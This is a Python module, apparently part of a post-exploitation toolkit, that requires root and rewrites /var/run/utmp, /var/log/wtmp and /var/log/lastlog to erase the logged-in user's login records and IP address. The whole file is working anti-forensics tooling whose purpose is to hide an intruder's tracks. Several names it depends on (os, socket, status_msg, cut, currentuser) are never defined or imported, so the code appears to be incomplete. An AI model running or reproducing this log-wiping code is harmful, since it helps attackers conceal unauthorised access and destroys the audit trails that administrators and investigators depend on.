
'''
@description: Attempts to remove the currently logged in username and IP address from utmp, wtmp and lastlog. Intrusive method.
@author: ohdae & sk [bindshell@live.com]
'''

def scrub():
    if currentuser != "root":
        status_msg("[!] You must be a root user to use this module!")
        return
  
    try:
        Current_User = os.getlogin()
    except OSError:
        status_msg("[!] User name not found in logs. Did you all ready execute scrub?")
        return
    
    newUtmp = scrubFile(UTMP_FILEPATH, Current_User)
    writeNewFile(UTMP_FILEPATH, newUtmp)
    status_msg("[*] utmp cleaned")
  
    newWtmp = scrubFile(WTMP_FILEPATH, Current_User)
    writeNewFile(WTMP_FILEPATH, newWtmp)
    status_msg("[*] wtmp cleaned")

    newLastlog = scrubLastlogFile(LASTLOG_FILEPATH, Current_User)
    writeNewFile(LASTLOG_FILEPATH, newLastlog)
    status_msg("[*] lastlog cleaned")
    status_msg("[~] execution complete.")


def scrubFile(filePath, Current_User):
    newUtmp = ""
    with open(filePath, "rb") as f:
        bytes = f.read(UTMP_STRUCT_SIZE)
        while bytes != "":
            data = struct.unpack("hi32s4s32s256shhiii36x", bytes)
            if cut(data[4]) != Current_User and cut(data[5]) != User_Ip_Address:
	            newUtmp += bytes
            bytes = f.read(UTMP_STRUCT_SIZE)
    f.close()
    return newUtmp


def scrubLastlogFile(filePath, Current_User):
    pw  	     = pwd.getpwnam(Current_User)
    uid	     = pw.pw_uid
    idCount    = 0
    newLastlog = ''
  
    with open(filePath, "rb") as f:
        bytes = f.read(LASTLOG_STRUCT_SIZE)
        while bytes != "":
            data = struct.unpack("hh32s256s", bytes)
            if (idCount != uid):
	            newLastlog += bytes
            idCount += 1
            bytes = f.read(LASTLOG_STRUCT_SIZE)
    return newLastlog


def writeNewFile(filePath, fileContents):
    f = open(filePath, "w+b")
    f.write(fileContents)
    f.close()


import logging
import struct
import getpass
import pwd

UTMP_STRUCT_SIZE    = 384
LASTLOG_STRUCT_SIZE = 292
UTMP_FILEPATH       = "/var/run/utmp"
WTMP_FILEPATH       = "/var/log/wtmp"
LASTLOG_FILEPATH    = "/var/log/lastlog"
User_Ip_Address = socket.gethostbyname(socket.gethostname())
scrub()

